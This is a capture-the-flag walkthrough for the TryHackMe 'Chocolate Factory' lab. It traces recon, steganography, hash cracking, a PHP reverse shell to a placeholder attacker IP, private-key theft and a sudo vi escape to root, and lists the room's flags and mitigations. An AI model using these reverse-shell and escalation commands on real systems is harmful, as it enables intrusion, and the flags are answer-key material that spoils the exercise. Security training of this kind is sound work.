# Chocolate Factory CTF Walkthrough

**Target:** Chocolate Factory
**Source:** [TryHackMe](https://tryhackme.com/room/chocolatefactory)
**Difficulty:** Easy
**Target IP:** 10.82.168.41

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Binary Analysis & Key Extraction](#binary-analysis--key-extraction)
- [Anonymous FTP & Steganography](#anonymous-ftp--steganography)
- [Shadow Hash Cracking](#shadow-hash-cracking)
- [RCE via Web Command Panel](#rce-via-web-command-panel)
- [Foothold via Private Key (charlie)](#foothold-via-private-key-charlie)
- [Privilege Escalation via vi](#privilege-escalation-via-vi)
- [Decrypting the Final Flag](#decrypting-the-final-flag)
- [Room Answers](#room-answers)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Chocolate Factory is a Willy Wonka-themed easy box that strings together an
unusual number of small puzzles: reverse-engineering a key out of a stripped
binary served on a non-standard port, extracting a `/etc/shadow` dump hidden
inside a steganographic image over anonymous FTP, cracking the resulting
SHA-512 hash online, and using the recovered credentials to reach an
unauthenticated web command-execution panel. A leaked SSH private key gives
a clean foothold, a passwordless `vi` sudo rule hands over root, and the
final flag is locked behind a Fernet-encrypted Python script requiring the
key extracted at the very start of the room.

**Key Skills Required:**
- Service/version enumeration across many open ports (`nmap`)
- Reverse engineering a stripped ELF binary (`strings`)
- Anonymous FTP and steganography (`steghide`)
- Base64 decoding and `/etc/shadow` analysis
- Online hash cracking (SHA-512crypt)
- Command-injection-style web panel abuse
- GTFOBins sudo abuse (`vi`)
- Symmetric decryption with a recovered key (`cryptography.fernet`)

---

## Reconnaissance

### Network Scanning

```bash
nmap 10.82.168.41
nmap -A -T4 10.82.168.41
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | ftp | vsftpd 3.0.5 (anonymous login allowed) |
| 22/tcp | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | http | Apache httpd 2.4.41 (Ubuntu) |
| 100/tcp | newacct | custom themed TCP service |
| 106/tcp | pop3pw | same themed custom service |
| 109/tcp | pop2 | same themed custom service |
| 110/tcp | pop3 | same themed custom service |
| 111/tcp | rpcbind | same themed custom service |
| 113/tcp | ident | hints at `key_rev_key` on the web server |
| 119/tcp | nntp | same themed custom service |
| 125/tcp | locus-map | same themed custom service |

Several high ports all return the same ASCII-art "Welcome to chocolate
room!!" banner via NSE fingerprinting, except port 113, which drops a direct
hint:

```
113/tcp open  ident?
|_    http://localhost/key_rev_key <- You will find the key here!!!
```

---

## Binary Analysis & Key Extraction

```bash
curl http://10.82.168.41/key_rev_key --output key_rev_key
strings key_rev_key
```

The binary prompts for a name and compares it against a hardcoded string
(`laksdhfas`) before printing a key:

```
Enter your name:
laksdhfas
 congratulations you have found the key:
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
 Keep its safe
Bad name!
```

The correct input is recovered straight from the strings dump, so the
binary never needs to be executed to extract the key.

> **Q1 — key found:** `b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='`

This key is held onto — it's needed again at the very end of the room.

---

## Anonymous FTP & Steganography

```bash
ftp 10.82.168.41
Name: anonymous
230 Login successful.
ftp> get gum_room.jpg
```

```bash
steghide extract -sf gum_room.jpg   # empty passphrase
```

```
wrote extracted data to "b64.txt".
```

The extracted file is base64-encoded shadow-file data:

```bash
base64 -d b64.txt
```

```
...
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

The `$6$` prefix identifies the hash as SHA-512crypt.

---

## Shadow Hash Cracking

The hash is submitted to an online cracking service:

```
https://hashes.com/en/decrypt/hash
```

```
$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:cn7824
```

> **Q2 — Charlie's password:** `cn7824`

Recovered credentials: `charlie : cn7824`

---

## RCE via Web Command Panel

Authenticating with the recovered credentials exposes a command-execution
panel on the web root:

```bash
curl http://10.82.168.41/home.php
```

```html
<form method="POST">
  <input id="comm" type="text" name="command" placeholder="Command">
  <button>Execute</button>
</form>
```

A PHP reverse shell one-liner is submitted as the `command` value:

```bash
php -r '$sock=fsockopen("<attacker_ip>",9009);exec("sh <&3 >&3 2>&3");'
```

```bash
rlwrap nc -nvlp 9009
```

```
connect to [<attacker_ip>] from (UNKNOWN) [10.82.168.41] 56648
whoami
www-data
```

---

## Foothold via Private Key (charlie)

A PTY upgrade is applied, and `charlie`'s home directory is checked:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
ls -l /home/charlie/
```

```
-rw-r--r-- 1 charlie charley 1675 Oct  6  2020 teleport
-rw-r--r-- 1 charlie charley  407 Oct  6  2020 teleport.pub
-rw-r----- 1 charlie charley   39 Oct  6  2020 user.txt
```

`user.txt` is unreadable by `www-data` directly, but `teleport` — a
world-readable file despite its name — turns out to be a raw RSA private
key for `charlie`:

```bash
cat /home/charlie/teleport
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----
```

The key is saved locally and used to log in directly:

```bash
nano rsa.ssh   # paste key contents
chmod 600 rsa.ssh
ssh -i rsa.ssh charlie@10.82.168.41
```

```bash
charlie@ip-10-82-168-41:~$ cat user.txt
flag{cd5509042371b34e4826e4838b522d2e}
```

> **Q3 — user flag:** `flag{cd5509042371b34e4826e4838b522d2e}`

---

## Privilege Escalation via vi

```bash
charlie@...:~$ sudo -l
```

```
User charlie may run the following commands on ip-10-82-168-41:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

Despite the `!root` restriction, the GTFOBins `vi` shell-escape technique
still yields an effective root shell on this configuration:

```bash
sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
```

```bash
# whoami
root
# ls -l /root
```

```
-rwxr-xr-x 1 charlie charley  491 Oct  1  2020 root.py
```

---

## Decrypting the Final Flag

`root.py` holds a Fernet-encrypted message that requires the key extracted
from the `key_rev_key` binary at the very start of the room:

```python
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess='gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
```

```bash
python root.py
Enter the key: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```

```
flag{cec59161d338fef787fcb4e296b42124}
```

> **Q4 — root flag:** `flag{cec59161d338fef787fcb4e296b42124}`

---

## Room Answers

| # | Question | Answer |
|---|----------|--------|
| Q1 | Key found in `key_rev_key` | `b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='` |
| Q2 | Charlie's password | `cn7824` |
| Q3 | User flag | `flag{cd5509042371b34e4826e4838b522d2e}` |
| Q4 | Root flag | `flag{cec59161d338fef787fcb4e296b42124}` |

---

## Vulnerabilities

### 1. Secret Hardcoded in a Publicly Downloadable Binary (Medium)

**Description:** `key_rev_key` contains both the expected input and the
secret output as plaintext strings inside the compiled ELF, retrievable
with `strings` alone.

**Impact:** The intended "challenge" key is trivially recoverable without
executing the binary or providing valid input.

**Mitigation:** Never embed secrets in distributed binaries; use
server-side validation and secret storage instead.

### 2. Anonymous FTP Exposing a Shadow File Dump (Critical)

**Description:** An anonymously-readable FTP share hosted a steganographic
image containing a base64-encoded `/etc/shadow` excerpt, including a
crackable password hash.

**Impact:** Direct path to valid user credentials via offline/online hash
cracking.

**Mitigation:**
- Disable anonymous FTP.
- Never expose `/etc/shadow` contents, even indirectly or encoded, outside
  the host.

### 3. Weak Password Crackable via Public Hash-Cracking Service (High)

**Description:** `charlie`'s SHA-512crypt hash was cracked via a public
online database in seconds.

**Impact:** Full account access once the hash was obtained.

**Mitigation:** Enforce strong password policies; assume any disclosed
hash will be cracked quickly if the underlying password is weak.

### 4. Unauthenticated/Weakly-Gated Command Execution Panel (Critical)

**Description:** `home.php`, reachable after basic authentication, exposes
a free-text command field with no input sanitization.

**Impact:** Full remote code execution as the web service user
(`www-data`).

**Mitigation:**
- Never expose raw command-execution functionality to end users.
- If such functionality is required, strictly allow-list permitted
  commands and run under a minimally-privileged service account.

### 5. World-Readable Private Key Misnamed to Avoid Detection (Critical)

**Description:** `charlie`'s SSH private key was stored as a world-readable
file named `teleport` rather than the conventional `id_rsa`, but remained
fully functional for authentication.

**Impact:** Allowed `www-data` to read and directly use the key to
authenticate as `charlie`.

**Mitigation:**
- Private keys must be mode `600`, owned solely by their user, regardless
  of filename.
- Audit home directories for unexpected key material.

### 6. Passwordless Sudo Rule for `vi` (Critical)

**Description:** `charlie` could run `/usr/bin/vi` via `sudo` with no
password, a documented GTFOBins escape primitive.

**Impact:** Full privilege escalation to an effective root shell.

**Mitigation:** Avoid granting sudo rights to general-purpose editors;
apply least-privilege scoping to all sudo rules.

---

## Attack Chain Summary

```
Nmap scan → FTP, SSH, HTTP + themed custom services on high ports
    ↓
port 113 ident hint → curl key_rev_key → strings → Fernet key recovered
    ↓
ftp anonymous → gum_room.jpg → steghide extract (empty pass) → b64.txt
    ↓
base64 decode → /etc/shadow dump → charlie's $6$ hash
    ↓
hashes.com crack → charlie:cn7824
    ↓
login → home.php command panel → PHP reverse shell → foothold: www-data
    ↓
ls /home/charlie → teleport (world-readable RSA private key)
    ↓
ssh -i rsa.ssh charlie → second foothold, user.txt
    ↓
sudo -l → NOPASSWD vi → sudo vi -c ':!/bin/sh' → root
    ↓
root.py (Fernet-encrypted) → decrypt with key from Q1 → root flag
    ↓
Room complete (Q1–Q4 answered)
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/OS detection |
| cURL | Fetching web content and the target binary |
| strings | Extracting hardcoded secrets from the ELF binary |
| ftp | Anonymous FTP enumeration and file retrieval |
| steghide | Steganography extraction |
| hashes.com | SHA-512crypt hash cracking |
| netcat (nc) / rlwrap | Reverse shell listener |
| GTFOBins (vi) | Sudo privilege escalation |
| Python (`cryptography.fernet`) | Final flag decryption |

---

## References

- [TryHackMe — Chocolate Factory](https://tryhackme.com/room/chocolatefactory)
- [GTFOBins — vi](https://gtfobins.github.io/gtfobins/vi/)
- [hashes.com](https://hashes.com/en/decrypt/hash)

---
